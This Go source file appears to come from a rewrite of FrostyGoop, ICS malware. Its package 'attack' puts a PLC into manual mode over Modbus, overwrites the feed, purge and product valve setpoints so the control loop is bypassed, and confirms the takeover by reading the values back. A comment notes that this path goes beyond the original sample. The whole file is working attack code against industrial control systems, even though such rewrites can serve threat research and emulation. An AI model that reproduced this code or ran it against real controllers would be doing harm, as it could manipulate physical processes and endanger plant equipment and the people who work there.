package attack

import (
	"errors"
	"fmt"
	"slices"
	"time"

	"github.com/abb00717/frostygoop-rewrite/internal/modbus"
)

const (
	runBitPollInterval = 200 * time.Millisecond
	runBitPollTimeout  = 5 * time.Second
)

type coilClient interface {
	ReadCoils(addr, count uint16) ([]bool, error)
	ReadHolding(addr, count uint16) ([]uint16, error)
	WriteCoil(addr uint16, on bool) error
	WriteMultiple(addr uint16, values []uint16) error
}

// CoilTakeover drives the valves directly, bypassing the control loop. This
// path needs FC01/FC05, which the sample did not have, so it is only reachable
// in the rewrite.
//
// Sequence: read run_bit and abort unless TRUE, set manual_mode, write the four
// setpoints in one FC16, read back, roll manual_mode off on any failure. The
// run_bit precheck is not defensive padding, the ST forces the purge valve wide
// open while it is FALSE and the attack silently does nothing.
func CoilTakeover(c *modbus.Conn, f1, f2, purge, product uint16) (*Result, error) {
	return coilTakeover(c, f1, f2, purge, product, runBitPollTimeout, runBitPollInterval)
}

func coilTakeover(c coilClient, f1, f2, purge, product uint16, runBitTimeout, runBitInterval time.Duration) (*Result, error) {
	if c == nil {
		return nil, errors.New("nil modbus connection")
	}

	res := &Result{Steps: make([]Step, 0, 6)}
	manualModeOn := false

	rollback := func() error {
		step := Step{Name: "rollback manual_mode", FC: 0x05, Addr: CoilManualMode, Value: []uint16{0x0000}}
		err := c.WriteCoil(CoilManualMode, false)
		if err != nil {
			step.Err = err.Error()
			res.Steps = append(res.Steps, step)
			return err
		}
		res.RolledBack = true
		res.Steps = append(res.Steps, step)
		return nil
	}

	runBitOn, runBitStep, err := waitRunBit(c, runBitTimeout, runBitInterval)
	res.Steps = append(res.Steps, runBitStep)
	if err != nil {
		return res, err
	}
	if !runBitOn {
		return res, errors.New("run_bit is false")
	}

	step := Step{Name: "set manual_mode", FC: 0x05, Addr: CoilManualMode, Value: []uint16{0xFF00}}
	err = c.WriteCoil(CoilManualMode, true)
	if err != nil {
		step.Err = err.Error()
		res.Steps = append(res.Steps, step)
		return res, fmt.Errorf("set manual_mode: %w", err)
	}
	manualModeOn = true
	res.Steps = append(res.Steps, step)

	setpoints := []uint16{f1, f2, purge, product}
	step = Step{Name: "write manual setpoints", FC: 0x10, Addr: HRManualSPBase, Value: slices.Clone(setpoints)}
	err = c.WriteMultiple(HRManualSPBase, setpoints)
	if err != nil {
		step.Err = err.Error()
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("write manual setpoints: %w (rollback failed: %v)", err, rbErr)
		}
		return res, fmt.Errorf("write manual setpoints: %w", err)
	}
	res.Steps = append(res.Steps, step)

	manualBits, err := c.ReadCoils(CoilManualMode, 1)
	step = Step{Name: "verify manual_mode", FC: 0x01, Addr: CoilManualMode}
	if err != nil {
		step.Err = err.Error()
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify manual_mode: %w (rollback failed: %v)", err, rbErr)
		}
		return res, fmt.Errorf("verify manual_mode: %w", err)
	}
	if len(manualBits) < 1 {
		step.Err = "empty coil response"
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify manual_mode: empty response (rollback failed: %v)", rbErr)
		}
		return res, errors.New("verify manual_mode: empty coil response")
	}
	step.Value = []uint16{boolToWord(manualBits[0])}
	if !manualBits[0] {
		step.Err = "manual_mode is false after write"
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify manual_mode: still false (rollback failed: %v)", rbErr)
		}
		return res, errors.New("verify manual_mode: still false")
	}
	res.Steps = append(res.Steps, step)

	actual, err := c.ReadHolding(HRManualSPBase, HRManualSPLen)
	step = Step{Name: "verify manual setpoints", FC: 0x03, Addr: HRManualSPBase}
	if err != nil {
		step.Err = err.Error()
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify manual setpoints: %w (rollback failed: %v)", err, rbErr)
		}
		return res, fmt.Errorf("verify manual setpoints: %w", err)
	}
	step.Value = slices.Clone(actual)
	if !slices.Equal(actual, setpoints) {
		step.Err = fmt.Sprintf("readback mismatch want=%v got=%v", setpoints, actual)
		res.Steps = append(res.Steps, step)
		rbErr := rollback()
		if rbErr != nil {
			return res, fmt.Errorf("verify manual setpoints mismatch (rollback failed: %v)", rbErr)
		}
		return res, errors.New("verify manual setpoints mismatch")
	}
	res.Steps = append(res.Steps, step)

	if manualModeOn {
		res.Success = true
	}
	return res, nil
}

func waitRunBit(c coilClient, timeout, interval time.Duration) (bool, Step, error) {
	step := Step{Name: "wait run_bit true", FC: 0x01, Addr: CoilRunBit}

	if interval <= 0 {
		interval = runBitPollInterval
	}
	if timeout <= 0 {
		timeout = runBitPollTimeout
	}

	deadline := time.Now().Add(timeout)
	attempts := 0

	for {
		attempts++
		bits, err := c.ReadCoils(CoilRunBit, 1)
		if err != nil {
			step.Err = err.Error()
			return false, step, fmt.Errorf("read run_bit: %w", err)
		}
		if len(bits) < 1 {
			step.Err = "empty coil response"
			return false, step, errors.New("read run_bit: empty coil response")
		}
		step.Value = []uint16{boolToWord(bits[0])}
		if bits[0] {
			step.Name = fmt.Sprintf("wait run_bit true (attempts=%d)", attempts)
			return true, step, nil
		}
		if time.Now().After(deadline) {
			step.Name = fmt.Sprintf("wait run_bit true (attempts=%d)", attempts)
			step.Err = fmt.Sprintf("timeout after %s", timeout)
			return false, step, nil
		}
		time.Sleep(interval)
	}
}

func boolToWord(on bool) uint16 {
	if on {
		return 1
	}
	return 0
}
